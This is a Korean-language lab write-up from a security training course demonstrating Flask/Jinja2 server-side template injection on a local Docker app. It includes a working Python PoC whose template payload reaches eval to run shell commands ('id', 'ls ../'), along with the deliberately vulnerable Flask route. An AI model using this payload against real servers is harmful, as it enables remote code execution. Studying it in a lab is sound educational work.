# Flask (Jinja2) SSTI (Server Side Template Injection)

> 화이트햇 스쿨 3기 - [박혜수 (@Pandyo)](https://github.com/Padnyo)]

<br/>

## 실습 환경 구성

1. docker과 docker-compose, python 등 실습에 필요한 프로그램 설치
2. `git clone`를 통해 실습 코드 clone
3. 선택한 취약점인 Flask 디렉토리의 docker-compose.yml 파일이 위치하는 곳으로 이동
4. `docker-compose up -d`를 통해 실습 환경 실행
5. `docker ps`를 통해 이미지 실행을 확인 후 해당 port 번호로 localhost 접속

<br/>

## 취약점 실습 진행

1. name의 파라미터 값으로 지정된 값을 화면에 그대로 출력시키는 것을 확인
![name의 파라미터 값으로 지정된 값을 화면에 그대로 출력시키는 것을 확인](https://github.com/user-attachments/assets/cd0c96e8-747e-4655-ae62-5dfdccf84821)
2. 파라미터 값에 템플릿 엔진에 삽입되는 템플릿 구문으로 연산 값 입력 시 7*7이 그대로 출력되는 것이 아닌 연산 결과가 출력되는 것을 통해 SSTI에 취약함을 확인
![연산 결과가 출력되는 것을 통해 SSTI에 취약함을 확인](https://github.com/user-attachments/assets/b3d643cd-869e-48c9-bf30-57368d09d685)
3. git 실습 코드에 포함된 아래의 poc.py 파일 실행
```python
from urllib import parse

# 실행할 Python 코드
script = '__import__("os").popen("id").read()'
# 서버에 전달할 템플릿 코드
value = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('%s') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
value = value.replace("%s", script)
print("[삽입될 템플릿 코드]")
print(value)
print()

# SSTI를 수행하는 URL
query = [("name", value)]
url = "http://localhost:8000/?"
url = url + parse.urlencode(query)  # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
print("[요청 URL]")
print(url)
print() 
```
4. 실행 결과로 출력된 요청 URL을 복사하여 웹 사이트에 입력
![실행 결과로 출력된 요청 URL을 복사하여 웹 사이트에 입력](https://github.com/user-attachments/assets/4b080377-5ebb-4af2-b3e7-3be84a4b7d52)
5. 템플릿 구문으로 입력된 내용이 실행되며 서버 프로세스의 id가 출력됨
![템플릿 구문으로 입력된 내용이 실행되며 서버 프로세스의 id가 출력됨](https://github.com/user-attachments/assets/610e5e80-6ca9-4307-8eae-cbbb28d244b7)
6. PoC 코드를 조금 수정해 ls ../ 명령어가 실행되도록 하면
```python
from urllib import parse

# 실행할 Python 코드
script = '__import__("os").popen("ls ../").read()'
# 서버에 전달할 템플릿 코드
value = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('%s') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
value = value.replace("%s", script)
print("[삽입될 템플릿 코드]")
print(value)
print()

# SSTI를 수행하는 URL
query = [("name", value)]
url = "http://localhost:8000/?"
url = url + parse.urlencode(query)  # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
print("[요청 URL]")
print(url)
print()
```
7. 명령어가 실행되며 상위 디렉토리가 나열되는 것을 확인 (다양한 명령어 실행이 가능한 것)
![명령어가 실행되며 상위 디렉토리가 나열되는 것을 확인](https://github.com/user-attachments/assets/cd77ee76-675a-41ec-9c14-91d33cf2479a)

<br/>

## 결과

- 해당 코드를 확인해보면 `Template("Hello " + name)` 부분에서 파라미터의 입력 값이 데이터로 전달되는 것이 아닌 템플릿에 연결되기 때문에 SSTI 취약점이 발생한 것 입니다.
```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()
```
- 이 경우 공격자는 임의의 명령어를 실행할 수 있으며, 이는 RCE(Remote Code Execution)으로 이어질 수 있는 심각한 취약점 입니다.
- 사용자의 입력값을 필터링하는 등의 방법으로 대응이 가능합니다.
